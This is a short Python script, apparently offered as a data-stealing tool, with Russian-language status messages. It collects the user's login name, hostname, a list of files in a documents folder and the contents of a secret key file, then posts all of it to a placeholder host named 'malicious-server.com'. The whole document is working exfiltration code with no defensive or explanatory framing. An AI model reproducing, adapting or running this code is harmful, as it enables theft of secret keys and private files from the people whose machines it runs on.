import os
import requests

def collect_data():
    data = {}
    data['user'] = os.getlogin()
    data['hostname'] = os.uname().nodename
    data['files'] = os.listdir('/home/user/documents')
    
    secret_file = '/home/user/secret.key'
    if os.path.exists(secret_file):
        with open(secret_file, 'r') as f:
            data['secret'] = f.read().strip()
    
    return data

def send_data(data):
    url = "http://malicious-server.com/collect"
    response = requests.post(url, json=data)
    return response.status_code

if __name__ == "__main__":
    stolen_data = collect_data()
    print("Собраны данные:", stolen_data)
    result = send_data(stolen_data)
    print("Отправка завершена")